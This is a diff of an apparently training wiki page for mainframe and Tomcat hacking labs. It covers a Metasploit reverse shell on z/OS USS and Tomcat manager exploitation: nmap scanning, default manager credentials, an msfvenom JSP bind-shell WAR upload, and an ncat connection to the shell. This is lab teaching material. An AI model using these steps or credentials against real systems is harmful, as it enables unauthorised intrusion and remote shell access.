@@ -10398,7 +10398,7 @@ int main(int argc, char *argv[]) {
 # Copy that dataset back to a new one in your HLQ 
 # Cat the resulting dataset to confirm</pre>
 </div>
-<div created="20210121010741239" modified="20210121011415318" tags="" title="UNIX Lab 8">
+<div created="20210121010741239" modified="20210121010915749" tags="" title="UNIX Lab 8">
 <pre>!!''Lab Objectives''
 # Use metasploit natively to obtain a reverse USS shell
 
@@ -10419,6 +10419,11 @@ int main(int argc, char *argv[]) {
 * Set ''LHOST'' to `0.0.0.0`: `set lhost 0.0.0.0`
 * Type `exploit` to launch the exploit and get a reverse shell
 
+''Questions'' 
+* What type of shell is this? 
+* Can you run TSO commands? Which ones? 
+* Can you cat a pds member, for example `EVIL##.REXXLIB(LAB01)`?
+
 ---
 
 !''Hacking Tomcat''
@@ -10435,7 +10440,8 @@ Use nmap, with default options and -sV to find the Tomcat server running:
 `nmap -sV evilmf.evilmainframe.com -p 8080`
 
 !!''Connect''
-* Open the web browser and connect to the port identified in the previous step
+* Open firefox and connect to the port identified in the previous step
+* `nikto` can easily find the credentials but to save you time:
 ** ''Username:'' `tomcat`
 ** ''Password:'' `evilmf`
 
@@ -10447,7 +10453,7 @@ Use nmap, with default options and -sV to find the Tomcat server running:
 ```
 msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f war &gt; shell_&lt;userid&gt;.war
 ```
-* With web browser browse to `http://k8s.evilmainframe.com:8080/manager/html`
+* With firefox browse to `http://k8s.evilmainframe.com:8080/manager/html`
 ** ''Username:'' `tomcat`
 ** ''Password:'' `gibson`
 * In the section ''WAR file to deploy'' click `Browse...`
@@ -10455,6 +10461,7 @@ msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f wa
 * click `Deploy`
 * In the ''Applications'' section in the `Path` column find your deployed page `/shell_&lt;userid&gt;` and click that link
 * It might take a bit for the page to load
+* While its loading try connecting with ncat: `ncat evilmf &lt;your port&gt;`
 ** It may take a few tries
 
 ''Questions''
